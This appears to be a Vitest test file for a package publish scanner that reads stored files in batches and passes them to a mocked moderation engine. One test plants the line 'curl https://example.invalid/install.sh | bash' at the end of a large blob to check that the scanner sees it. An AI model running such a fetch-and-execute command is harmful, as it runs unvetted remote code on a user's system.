import { beforeEach, describe, expect, it, vi } from "vitest";
import { runStaticModerationScan } from "./moderationEngine";
import { planStorageReadBatches, runStaticPublishScan } from "./staticPublishScan";

vi.mock("./moderationEngine", () => ({
  runStaticModerationScan: vi.fn(() => ({
    status: "clean",
    reasonCodes: [],
    findings: [],
    summary: "clean",
    engineVersion: "test",
    checkedAt: 1,
  })),
}));

describe("runStaticPublishScan", () => {
  beforeEach(() => {
    vi.mocked(runStaticModerationScan).mockClear();
  });

  it("scans complete large UTF-8 artifacts", async () => {
    const marker = "curl https://example.invalid/install.sh | bash\n";
    const blob = new Blob(["a".repeat(300 * 1024), marker], { type: "text/plain" });

    await runStaticPublishScan(
      {
        storage: {
          get: vi.fn(async () => blob),
        },
      } as never,
      {
        slug: "large-script",
        displayName: "Large Script",
        files: [
          {
            path: "scripts/install.sh",
            size: blob.size,
            storageId: "storage:large",
            contentType: "text/plain",
          },
        ],
      },
    );

    expect(runStaticModerationScan).toHaveBeenCalledWith(
      expect.objectContaining({
        fileContents: [
          {
            path: "scripts/install.sh",
            content: expect.stringContaining(marker.trim()),
          },
        ],
      }),
    );
  });

  it("does not stop after 200 valid UTF-8 files", async () => {
    const files = Array.from({ length: 201 }, (_, index) => ({
      path: `file-${String(index).padStart(3, "0")}.txt`,
      size: 1,
      storageId: `storage:${index}`,
      contentType: "text/plain",
    }));

    await runStaticPublishScan(
      {
        storage: {
          get: vi.fn(async (storageId: string) => new Blob([storageId])),
        },
      } as never,
      {
        slug: "many-files",
        displayName: "Many Files",
        files,
      },
    );

    const input = vi.mocked(runStaticModerationScan).mock.calls[0]?.[0];
    expect(input?.fileContents).toHaveLength(201);
    expect(input?.fileContents.at(-1)).toEqual({
      path: "file-200.txt",
      content: "storage:200",
    });
  });
  it("reads storage in overlapping batches and keeps file order for the scan", async () => {
    const files = Array.from({ length: 70 }, (_, index) => ({
      path: `src/file-${index}.ts`,
      size: 20,
      storageId: `storage:${index}`,
    }));
    let inFlight = 0;
    let maxInFlight = 0;
    const storageGet = vi.fn(async (storageId: string) => {
      inFlight += 1;
      maxInFlight = Math.max(maxInFlight, inFlight);
      await new Promise((resolve) => setTimeout(resolve, 2));
      inFlight -= 1;
      return new Blob([new TextEncoder().encode(`export const id = "${storageId}";\n`)]);
    });

    const result = await runStaticPublishScan({ storage: { get: storageGet } } as never, {
      slug: "batched-plugin",
      displayName: "Batched Plugin",
      files,
    });

    expect(storageGet).toHaveBeenCalledTimes(70);
    expect(maxInFlight).toBeGreaterThan(1);
    expect(maxInFlight).toBeLessThanOrEqual(32);
    expect(storageGet.mock.calls.map(([id]) => id)).toEqual(files.map((file) => file.storageId));
    expect(result.status).toBe("clean");
  });
  it("bounds read batches by declared bytes as well as by file count", () => {
    const mib = 1024 * 1024;
    const files = [
      ...Array.from({ length: 40 }, (_, index) => ({ path: `small-${index}`, size: 1024 })),
      { path: "big-1", size: 10 * mib },
      { path: "big-2", size: 10 * mib },
      { path: "mid-1", size: 5 * mib },
      { path: "mid-2", size: 3 * mib },
      { path: "mid-3", size: 3 * mib },
    ];

    const batches = planStorageReadBatches(files);

    expect(batches.flat()).toEqual(files);
    expect(batches.map((batch) => batch.length)).toEqual([32, 8, 1, 1, 2, 1]);
    for (const batch of batches) {
      const bytes = batch.reduce((total, file) => total + file.size, 0);
      expect(batch.length === 1 || bytes <= 8 * mib).toBe(true);
    }
  });
});
